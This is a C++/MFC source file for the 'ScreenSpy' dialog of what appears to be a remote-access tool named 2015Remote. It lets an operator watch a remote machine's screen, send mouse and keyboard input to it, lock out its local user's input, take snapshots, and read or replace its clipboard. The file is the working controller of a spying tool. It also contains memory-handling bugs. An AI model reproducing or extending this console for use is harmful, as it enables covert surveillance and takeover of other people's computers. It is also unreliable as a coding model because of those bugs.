// ScreenSpyDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "2015Remote.h"
#include "ScreenSpyDlg.h"
#include "afxdialogex.h"
#include <imm.h>


// CScreenSpyDlg 对话框

enum
{
	IDM_CONTROL = 0x1010,
	IDM_FULLSCREEN, 
	IDM_SEND_CTRL_ALT_DEL,
	IDM_TRACE_CURSOR,	// 跟踪显示远程鼠标
	IDM_BLOCK_INPUT,	// 锁定远程计算机输入
	IDM_SAVEDIB,		// 保存图片
	IDM_GET_CLIPBOARD,	// 获取剪贴板
	IDM_SET_CLIPBOARD,	// 设置剪贴板
};

IMPLEMENT_DYNAMIC(CScreenSpyDlg, CDialog)

#define ALGORITHM_DIFF 1

CScreenSpyDlg::CScreenSpyDlg(CWnd* Parent, IOCPServer* IOCPServer, CONTEXT_OBJECT* ContextObject)
	: CDialog(CScreenSpyDlg::IDD, Parent)
{
	ImmDisableIME(0);// 禁用输入法
	m_bFullScreen = FALSE;

	m_iocpServer	= IOCPServer;
	m_ContextObject	= ContextObject;

	CHAR szFullPath[MAX_PATH];
	GetSystemDirectory(szFullPath, MAX_PATH);
	lstrcat(szFullPath, "\\shell32.dll");  //图标
	m_hIcon = ExtractIcon(AfxGetApp()->m_hInstance, szFullPath, 17);
	m_hCursor = LoadCursor(AfxGetApp()->m_hInstance, MAKEINTRESOURCE(IDC_ARROWS));

	sockaddr_in  ClientAddr;
	memset(&ClientAddr, 0, sizeof(ClientAddr));
	int ulClientAddrLen = sizeof(sockaddr_in);
	BOOL bOk = getpeername(m_ContextObject->sClientSocket,(SOCKADDR*)&ClientAddr, &ulClientAddrLen);

	m_strClientIP = bOk != INVALID_SOCKET ? inet_ntoa(ClientAddr.sin_addr) : "";

	m_bIsFirst = TRUE;
	m_ulHScrollPos = 0;
	m_ulVScrollPos = 0;

	ULONG	ulBitmapInforLength = m_ContextObject->InDeCompressedBuffer.GetBufferLength() - 1;
	m_BitmapInfor_Full = (BITMAPINFO *) new BYTE[ulBitmapInforLength];

	memcpy(m_BitmapInfor_Full, m_ContextObject->InDeCompressedBuffer.GetBuffer(1), ulBitmapInforLength);

	m_bIsCtrl = FALSE;
	m_bIsTraceCursor = FALSE;
}


VOID CScreenSpyDlg::SendNext(void)
{
	BYTE	bToken = COMMAND_NEXT;
	m_iocpServer->OnClientPreSending(m_ContextObject, &bToken, 1);
}


CScreenSpyDlg::~CScreenSpyDlg()
{
	if (m_BitmapInfor_Full!=NULL)
	{
		delete m_BitmapInfor_Full;
		m_BitmapInfor_Full = NULL;
	}

	::ReleaseDC(m_hWnd, m_hFullDC);   //GetDC
	::DeleteDC(m_hFullMemDC);                //Create匹配内存DC

	::DeleteObject(m_BitmapHandle);
	if (m_BitmapData_Full!=NULL)
	{
		m_BitmapData_Full = NULL;
	}
}

void CScreenSpyDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}


BEGIN_MESSAGE_MAP(CScreenSpyDlg, CDialog)
	ON_WM_CLOSE()
	ON_WM_PAINT()
	ON_WM_SYSCOMMAND()
	ON_WM_HSCROLL()
	ON_WM_VSCROLL()
	ON_WM_LBUTTONDOWN()
	ON_WM_LBUTTONUP()
	ON_WM_MOUSEWHEEL()
	ON_WM_MOUSEMOVE()
	ON_WM_KILLFOCUS()
	ON_WM_SIZE()
END_MESSAGE_MAP()


// CScreenSpyDlg 消息处理程序


BOOL CScreenSpyDlg::OnInitDialog()
{
	CDialog::OnInitDialog();
	SetIcon(m_hIcon,FALSE);

	CString strString;
	strString.Format("%s - 远程桌面控制 %d×%d", m_strClientIP, 
		m_BitmapInfor_Full->bmiHeader.biWidth, m_BitmapInfor_Full->bmiHeader.biHeight);
	SetWindowText(strString);

	m_hFullDC = ::GetDC(m_hWnd);
	m_hFullMemDC = CreateCompatibleDC(m_hFullDC);
	m_BitmapHandle = CreateDIBSection(m_hFullDC, m_BitmapInfor_Full, 
		DIB_RGB_COLORS, &m_BitmapData_Full, NULL, NULL);   //创建应用程序可以直接写入的、与设备无关的位图

	SelectObject(m_hFullMemDC, m_BitmapHandle);//择一对象到指定的设备上下文环境

	SetScrollRange(SB_HORZ, 0, m_BitmapInfor_Full->bmiHeader.biWidth);  //指定滚动条范围的最小值和最大值
	SetScrollRange(SB_VERT, 0, m_BitmapInfor_Full->bmiHeader.biHeight);//1366  768

	CMenu* SysMenu = GetSystemMenu(FALSE);
	if (SysMenu != NULL)
	{
		SysMenu->AppendMenu(MF_SEPARATOR);
		SysMenu->AppendMenu(MF_STRING, IDM_CONTROL, "控制屏幕(&Y)");
		SysMenu->AppendMenu(MF_STRING, IDM_FULLSCREEN, "全屏(&F)");
		SysMenu->AppendMenu(MF_STRING, IDM_TRACE_CURSOR, "跟踪被控端鼠标(&T)");
		SysMenu->AppendMenu(MF_STRING, IDM_BLOCK_INPUT, "锁定被控端鼠标和键盘(&L)");
		SysMenu->AppendMenu(MF_STRING, IDM_SAVEDIB, "保存快照(&S)");
		SysMenu->AppendMenu(MF_SEPARATOR);
		SysMenu->AppendMenu(MF_STRING, IDM_GET_CLIPBOARD, "获取剪贴板(&R)");
		SysMenu->AppendMenu(MF_STRING, IDM_SET_CLIPBOARD, "设置剪贴板(&L)");
		SysMenu->AppendMenu(MF_SEPARATOR);
	}

	m_bIsCtrl = FALSE;   //不是控制
	m_bIsTraceCursor = FALSE;  //不是跟踪
	m_ClientCursorPos.x = 0;
	m_ClientCursorPos.y = 0;
	m_bCursorIndex = 0;

	SendNext();

	return TRUE;
}


VOID CScreenSpyDlg::OnClose()
{
#if CLOSE_DELETE_DLG
	m_ContextObject->v1 = 0;
#endif
	CancelIo((HANDLE)m_ContextObject->sClientSocket);
	closesocket(m_ContextObject->sClientSocket);

	CDialog::OnClose();
#if CLOSE_DELETE_DLG
	delete this;
#endif
}


VOID CScreenSpyDlg::OnReceiveComplete()
{
	assert (m_ContextObject);

	switch(m_ContextObject->InDeCompressedBuffer.GetBuffer()[0])
	{
	case TOKEN_FIRSTSCREEN:
		{
			DrawFirstScreen();
			break;
		}
	case TOKEN_NEXTSCREEN:
		{
			if (m_ContextObject->InDeCompressedBuffer.GetBuffer(0)[1]==ALGORITHM_DIFF)
			{
				DrawNextScreenDiff();
			}
			break;
		}
	case TOKEN_CLIPBOARD_TEXT:
		{
			UpdateServerClipboard((char*)m_ContextObject->InDeCompressedBuffer.GetBuffer(1), 
				m_ContextObject->InDeCompressedBuffer.GetBufferLength() - 1);
			break;
		}
	}
}

VOID CScreenSpyDlg::DrawFirstScreen(void)
{
	m_bIsFirst = FALSE;

	//得到被控端发来的数据 ，将他拷贝到HBITMAP的缓冲区中，这样一个图像就出现了
	memcpy(m_BitmapData_Full, m_ContextObject->InDeCompressedBuffer.GetBuffer(1), m_BitmapInfor_Full->bmiHeader.biSizeImage);

	PostMessage(WM_PAINT);//触发WM_PAINT消息
}

VOID CScreenSpyDlg::DrawNextScreenDiff(void)
{
	//该函数不是直接画到屏幕上，而是更新一下变化部分的屏幕数据然后调用
	//OnPaint画上去
	//根据鼠标是否移动和屏幕是否变化判断是否重绘鼠标，防止鼠标闪烁
	BOOL	bChange = FALSE;
	ULONG	ulHeadLength = 1 + 1 + sizeof(POINT) + sizeof(BYTE); // 标识 + 算法 + 光标 位置 + 光标类型索引
	LPVOID	FirstScreenData = m_BitmapData_Full;
	LPVOID	NextScreenData = m_ContextObject->InDeCompressedBuffer.GetBuffer(ulHeadLength);
	ULONG	NextScreenLength = m_ContextObject->InDeCompressedBuffer.GetBufferLength() - ulHeadLength;

	POINT	OldClientCursorPos;
	memcpy(&OldClientCursorPos, &m_ClientCursorPos, sizeof(POINT));
	memcpy(&m_ClientCursorPos, m_ContextObject->InDeCompressedBuffer.GetBuffer(2), sizeof(POINT));

	// 鼠标移动了
	if (memcmp(&OldClientCursorPos, &m_ClientCursorPos, sizeof(POINT)) != 0)
	{
		bChange = TRUE;
	}

	// 光标类型发生变化
	BYTE bOldCursorIndex = m_bCursorIndex;
	m_bCursorIndex = m_ContextObject->InDeCompressedBuffer.GetBuffer(2+sizeof(POINT))[0];
	if (bOldCursorIndex != m_bCursorIndex)
	{
		bChange = TRUE;
		if (m_bIsCtrl && !m_bIsTraceCursor)//替换指定窗口所属类的WNDCLASSEX结构
			SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)m_CursorInfo.getCursorHandle(m_bCursorIndex == (BYTE)-1 ? 1 : m_bCursorIndex));
	}

	// 屏幕是否变化
	if (NextScreenLength > 0) 
	{
		bChange = TRUE;
	}

	//lodsd指令从ESI指向的内存位置4个字节内容放入EAX中并且下移4
	//movsb指令字节传送数据，通过SI和DI这两个寄存器控制字符串的源地址和目标地址
	//m_rectBuffer [0002 esi0002 esi000A 000C]     [][]edi[][][][][][][][][][][][][][][][][]
	__asm
	{
		mov ebx, [NextScreenLength]   //ebx 16  
		mov esi, [NextScreenData]  
		jmp	CopyEnd
CopyNextBlock:
		mov edi, [FirstScreenData]
		lodsd	            // 把lpNextScreen的第一个双字节，放到eax中,就是DIB中改变区域的偏移
			add edi, eax	// lpFirstScreen偏移eax	
			lodsd           // 把lpNextScreen的下一个双字节，放到eax中, 就是改变区域的大小
			mov ecx, eax
			sub ebx, 8      // ebx 减去 两个dword
			sub ebx, ecx    // ebx 减去DIB数据的大小
			rep movsb
CopyEnd:
		cmp ebx, 0 // 是否写入完毕
			jnz CopyNextBlock
	}

	if (bChange)
	{
		PostMessage(WM_PAINT);
	}
}


void CScreenSpyDlg::OnPaint()
{
	CPaintDC dc(this); // device context for painting

	if (m_bIsFirst)
	{
		DrawTipString("请等待......");
		return;
	}

	BitBlt(m_hFullDC,0,0,
		m_BitmapInfor_Full->bmiHeader.biWidth, 
		m_BitmapInfor_Full->bmiHeader.biHeight,
		m_hFullMemDC,
		m_ulHScrollPos,
		m_ulVScrollPos,
		SRCCOPY
		);

	if (m_bIsTraceCursor)
		DrawIconEx(
		m_hFullDC,								
		m_ClientCursorPos.x  - m_ulHScrollPos, 
		m_ClientCursorPos.y  - m_ulVScrollPos,
		m_CursorInfo.getCursorHandle(m_bCursorIndex == (BYTE)-1 ? 1 : m_bCursorIndex),
		0,0,										
		0,										
		NULL,									
		DI_NORMAL | DI_COMPAT					
		);
}

VOID CScreenSpyDlg::DrawTipString(CString strString)
{
	RECT Rect;
	GetClientRect(&Rect);
	//COLORREF用来描绘一个RGB颜色
	COLORREF  BackgroundColor = RGB(0x00, 0x00, 0x00);	
	COLORREF  OldBackgroundColor  = SetBkColor(m_hFullDC, BackgroundColor);
	COLORREF  OldTextColor = SetTextColor(m_hFullDC, RGB(0xff,0x00,0x00));
	//ExtTextOut函数可以提供一个可供选择的矩形，用当前选择的字体、背景颜色和正文颜色来绘制一个字符串
	ExtTextOut(m_hFullDC, 0, 0, ETO_OPAQUE, &Rect, NULL, 0, NULL);

	DrawText (m_hFullDC, strString, -1, &Rect,DT_SINGLELINE | DT_CENTER | DT_VCENTER);

	SetBkColor(m_hFullDC, BackgroundColor);
	SetTextColor(m_hFullDC, OldBackgroundColor);
}


void CScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	CMenu* SysMenu = GetSystemMenu(FALSE);

	switch (nID)
	{
	case IDM_CONTROL:
		{
			m_bIsCtrl = !m_bIsCtrl;
			SysMenu->CheckMenuItem(IDM_CONTROL, m_bIsCtrl ? MF_CHECKED : MF_UNCHECKED);
			break;
		}
	case IDM_FULLSCREEN: // 全屏
		{
			EnterFullScreen();
			SysMenu->CheckMenuItem(IDM_FULLSCREEN, MF_CHECKED); //菜单样式
			break;
		}
	case IDM_SAVEDIB:    // 快照保存
		{
			SaveSnapshot();
			break;
		}
	case IDM_TRACE_CURSOR: // 跟踪被控端鼠标
		{	
			m_bIsTraceCursor = !m_bIsTraceCursor; //这里在改变数据
			SysMenu->CheckMenuItem(IDM_TRACE_CURSOR, m_bIsTraceCursor ? MF_CHECKED : MF_UNCHECKED);//在菜单打钩不打钩

			// 重绘消除或显示鼠标
			OnPaint();
			break;
		}
	case IDM_BLOCK_INPUT: // 锁定服务端鼠标和键盘
		{
			BOOL bIsChecked = SysMenu->GetMenuState(IDM_BLOCK_INPUT, MF_BYCOMMAND) & MF_CHECKED;
			SysMenu->CheckMenuItem(IDM_BLOCK_INPUT, bIsChecked ? MF_UNCHECKED : MF_CHECKED);

			BYTE	bToken[2];
			bToken[0] = COMMAND_SCREEN_BLOCK_INPUT;
			bToken[1] = !bIsChecked;
			m_iocpServer->OnClientPreSending(m_ContextObject, bToken, sizeof(bToken));
			break;
		}
	case IDM_GET_CLIPBOARD: //想要Client的剪贴板内容
		{
			BYTE	bToken = COMMAND_SCREEN_GET_CLIPBOARD;
			m_iocpServer->OnClientPreSending(m_ContextObject, &bToken, sizeof(bToken));
			break;
		}
	case IDM_SET_CLIPBOARD: //给他
		{
			SendServerClipboard();
			break;
		}
	}

	CDialog::OnSysCommand(nID, lParam);
}


BOOL CScreenSpyDlg::PreTranslateMessage(MSG* pMsg)
{
#define MAKEDWORD(h,l)        (((unsigned long)h << 16) | l) 
	switch (pMsg->message)
	{
	case WM_LBUTTONDOWN:
	case WM_LBUTTONUP:
	case WM_RBUTTONDOWN:
	case WM_RBUTTONUP:
	case WM_MOUSEMOVE:
	case WM_LBUTTONDBLCLK:
	case WM_RBUTTONDBLCLK:
	case WM_MBUTTONDOWN:
	case WM_MBUTTONUP:
	case WM_MOUSEWHEEL:
		{
			MSG	Msg;
			memcpy(&Msg, pMsg, sizeof(MSG));
			Msg.lParam = MAKEDWORD(HIWORD(pMsg->lParam) + m_ulVScrollPos, LOWORD(pMsg->lParam) + m_ulHScrollPos);
			Msg.pt.x += m_ulHScrollPos;
			Msg.pt.y += m_ulVScrollPos;
			SendCommand(&Msg);
		}
		break;
	case WM_KEYDOWN:
	case WM_KEYUP:
	case WM_SYSKEYDOWN:
	case WM_SYSKEYUP:
		if (pMsg->wParam == VK_F11 && LeaveFullScreen()) // F11: 退出全屏
			return TRUE;
		if (pMsg->wParam != VK_LWIN && pMsg->wParam != VK_RWIN)
		{
			MSG	Msg;
			memcpy(&Msg, pMsg, sizeof(MSG));
			Msg.lParam = MAKEDWORD(HIWORD(pMsg->lParam) + m_ulVScrollPos, LOWORD(pMsg->lParam) + m_ulHScrollPos);
			Msg.pt.x += m_ulHScrollPos;
			Msg.pt.y += m_ulVScrollPos;
			SendCommand(&Msg);
		}
		if (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE)
			return TRUE;// 屏蔽Enter和ESC关闭对话
		break;
	}

	return CDialog::PreTranslateMessage(pMsg);
}


VOID CScreenSpyDlg::SendCommand(MSG* Msg)
{
	if (!m_bIsCtrl)
		return;

	const int length = sizeof(MSG) + 1;
	BYTE szData[length + 3];
	szData[0] = COMMAND_SCREEN_CONTROL;
	memcpy(szData + 1, Msg, sizeof(MSG));
	szData[length] = 0;
	m_iocpServer->OnClientPreSending(m_ContextObject, szData, length);
}

BOOL CScreenSpyDlg::SaveSnapshot(void)
{
	CString	strFileName = m_strClientIP + CTime::GetCurrentTime().Format("_%Y-%m-%d_%H-%M-%S.bmp");
	CFileDialog Dlg(FALSE, "bmp", strFileName, OFN_OVERWRITEPROMPT, "位图文件(*.bmp)|*.bmp|", this);
	if(Dlg.DoModal () != IDOK)
		return FALSE;

	BITMAPFILEHEADER	BitMapFileHeader;
	LPBITMAPINFO		BitMapInfor = m_BitmapInfor_Full; //1920 1080  1  0000
	CFile	File;
	if (!File.Open( Dlg.GetPathName(), CFile::modeWrite | CFile::modeCreate))
	{
		return FALSE;
	}

	// BITMAPINFO大小
	//+ (BitMapInfor->bmiHeader.biBitCount > 16 ? 1 : (1 << BitMapInfor->bmiHeader.biBitCount)) * sizeof(RGBQUAD)
	//bmp  fjkdfj  dkfjkdfj [][][][]
	int	nbmiSize = sizeof(BITMAPINFO);

	//协议  TCP    校验值
	BitMapFileHeader.bfType			= ((WORD) ('M' << 8) | 'B');	
	BitMapFileHeader.bfSize			= BitMapInfor->bmiHeader.biSizeImage + sizeof(BitMapFileHeader);  //8421
	BitMapFileHeader.bfReserved1 	= 0;                                          //8000
	BitMapFileHeader.bfReserved2 	= 0;
	BitMapFileHeader.bfOffBits		= sizeof(BitMapFileHeader) + nbmiSize;

	File.Write(&BitMapFileHeader, sizeof(BitMapFileHeader));
	File.Write(BitMapInfor, nbmiSize);

	File.Write(m_BitmapData_Full, BitMapInfor->bmiHeader.biSizeImage);
	File.Close();

	return true;
}


VOID CScreenSpyDlg::UpdateServerClipboard(char *szBuffer,ULONG ulLength)
{
	if (!::OpenClipboard(NULL))
		return;

	::EmptyClipboard();
	HGLOBAL hGlobal = GlobalAlloc(GPTR, ulLength);  
	if (hGlobal != NULL) { 

		char*  szClipboardVirtualAddress  = (LPTSTR) GlobalLock(hGlobal); 
		memcpy(szClipboardVirtualAddress,szBuffer,ulLength); 
		GlobalUnlock(hGlobal);         
		SetClipboardData(CF_TEXT, hGlobal); 
		GlobalFree(hGlobal);
	}
	CloseClipboard();
}

VOID CScreenSpyDlg::SendServerClipboard(void)
{
	if (!::OpenClipboard(NULL))  //打开剪切板设备
		return;
	HGLOBAL hGlobal = GetClipboardData(CF_TEXT);   //代表着一个内存
	if (hGlobal == NULL)
	{
		::CloseClipboard();
		return;
	}
	int	  iPacketLength = GlobalSize(hGlobal) + 1;
	char*   szClipboardVirtualAddress = (LPSTR) GlobalLock(hGlobal);    //锁定 
	LPBYTE	szBuffer = new BYTE[iPacketLength];

	szBuffer[0] = COMMAND_SCREEN_SET_CLIPBOARD;
	memcpy(szBuffer + 1, szClipboardVirtualAddress, iPacketLength - 1);
	::GlobalUnlock(hGlobal); 
	::CloseClipboard();
	m_iocpServer->OnClientPreSending(m_ContextObject,(PBYTE)szBuffer, iPacketLength);
	delete[] szBuffer;
}


void CScreenSpyDlg::OnHScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar)
{
	SCROLLINFO si = {sizeof(si)};
	si.fMask = SIF_ALL;
	GetScrollInfo(SB_HORZ, &si);

	int nPrevPos = si.nPos;
	switch(nSBCode)
	{
	case SB_LEFT:
		si.nPos = si.nMin;
		break;
	case SB_RIGHT:
		si.nPos = si.nMax;
		break;
	case SB_LINELEFT:
		si.nPos -= 8;
		break;
	case SB_LINERIGHT:
		si.nPos += 8;
		break;
	case SB_PAGELEFT:
		si.nPos -= si.nPage;
		break;
	case SB_PAGERIGHT:
		si.nPos += si.nPage;
		break;
	case SB_THUMBTRACK:
		si.nPos = si.nTrackPos;
		break;
	default:
		break;
	}
	si.fMask = SIF_POS;
	SetScrollInfo(SB_HORZ, &si, TRUE);
	if (si.nPos != nPrevPos)
	{
		m_ulHScrollPos += si.nPos - nPrevPos;
		ScrollWindow(nPrevPos - si.nPos, 0, NULL, NULL);
	}

	CDialog::OnHScroll(nSBCode, nPrevPos, pScrollBar);
}


void CScreenSpyDlg::OnVScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar)
{
	SCROLLINFO si = {sizeof(si)};
	si.fMask = SIF_ALL;
	GetScrollInfo(SB_VERT, &si);

	int nPrevPos = si.nPos;
	switch(nSBCode)
	{
	case SB_TOP:
		si.nPos = si.nMin;
		break;
	case SB_BOTTOM:
		si.nPos = si.nMax;
		break;
	case SB_LINEUP:
		si.nPos -= 8;
		break;
	case SB_LINEDOWN:
		si.nPos += 8;
		break;
	case SB_PAGEUP:
		si.nPos -= si.nPage;
		break;
	case SB_PAGEDOWN:
		si.nPos += si.nPage;
		break;
	case SB_THUMBTRACK:
		si.nPos = si.nTrackPos;
		break;
	default:
		break;
	}
	si.fMask = SIF_POS;
	SetScrollInfo(SB_VERT, &si, TRUE);
	if (si.nPos != nPrevPos)
	{
		m_ulVScrollPos += si.nPos - nPrevPos;
		ScrollWindow(0, nPrevPos - si.nPos, NULL, NULL);
	}

	CDialog::OnVScroll(nSBCode, nPrevPos, pScrollBar);
}


void CScreenSpyDlg::EnterFullScreen()
{
	if (!m_bFullScreen)
	{
		//get current system resolution
		int g_iCurScreenWidth = GetSystemMetrics(SM_CXSCREEN);
		int g_iCurScreenHeight = GetSystemMetrics(SM_CYSCREEN);

		//for full screen while backplay
		GetWindowPlacement(&m_struOldWndpl);

		CRect rectWholeDlg;//entire client(including title bar)
		CRect rectClient;//client area(not including title bar)
		CRect rectFullScreen;
		GetWindowRect(&rectWholeDlg);
		RepositionBars(0, 0xffff, AFX_IDW_PANE_FIRST, reposQuery, &rectClient);
		ClientToScreen(&rectClient);

		rectFullScreen.left = rectWholeDlg.left-rectClient.left;
		rectFullScreen.top = rectWholeDlg.top-rectClient.top;
		rectFullScreen.right = rectWholeDlg.right+g_iCurScreenWidth - rectClient.right;
		rectFullScreen.bottom = rectWholeDlg.bottom+g_iCurScreenHeight - rectClient.bottom;
		//enter into full screen;
		WINDOWPLACEMENT struWndpl;
		struWndpl.length = sizeof(WINDOWPLACEMENT);
		struWndpl.flags = 0;
		struWndpl.showCmd = SW_SHOWNORMAL;
		struWndpl.rcNormalPosition = rectFullScreen;
		SetWindowPlacement(&struWndpl);
		m_bFullScreen = true;
	}
}

// 全屏退出成功则返回true
bool CScreenSpyDlg::LeaveFullScreen()
{
	if (m_bFullScreen)
	{
		SetWindowPlacement(&m_struOldWndpl);
		CMenu *SysMenu = GetSystemMenu(FALSE);
		SysMenu->CheckMenuItem(IDM_FULLSCREEN, MF_UNCHECKED); //菜单样式
		m_bFullScreen = false;
		return true;
	}
	return false;
}

void CScreenSpyDlg::OnLButtonDown(UINT nFlags, CPoint point)
{
	CDialog::OnLButtonDown(nFlags, point);
}


void CScreenSpyDlg::OnLButtonUp(UINT nFlags, CPoint point)
{
	CDialog::OnLButtonUp(nFlags, point);
}


BOOL CScreenSpyDlg::OnMouseWheel(UINT nFlags, short zDelta, CPoint pt)
{
	return CDialog::OnMouseWheel(nFlags, zDelta, pt);
}


void CScreenSpyDlg::OnMouseMove(UINT nFlags, CPoint point)
{
	CDialog::OnMouseMove(nFlags, point);
}


void CScreenSpyDlg::OnKillFocus(CWnd* pNewWnd)
{
	CDialog::OnKillFocus(pNewWnd);
}


void CScreenSpyDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialog::OnSize(nType, cx, cy);
}
